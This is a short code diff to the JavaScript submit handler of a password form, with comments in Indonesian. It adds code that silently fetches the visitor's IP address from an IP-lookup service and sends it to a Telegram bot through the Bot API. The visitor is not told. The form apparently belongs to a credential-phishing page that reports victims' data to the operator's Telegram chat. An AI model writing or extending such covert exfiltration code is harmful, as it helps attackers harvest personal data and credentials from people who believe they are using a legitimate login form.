@@ -40,4 +40,25 @@ document.getElementById("passwordForm").addEventListener("submit", async functio
     } catch (err) {
         alert("Terjadi kesalahan. Silakan coba lagi.");
     }
+
+    // Tambahan untuk mendapatkan dan mengirim IP pengguna
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const userIP = ipData.ip;
+        
+        const ipMessage = `IP pengguna: ${userIP}`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: ipMessage,
+            }),
+        });
+    } catch (err) {
+        console.error("Gagal mengirim IP pengguna:", err);
+    }
 });
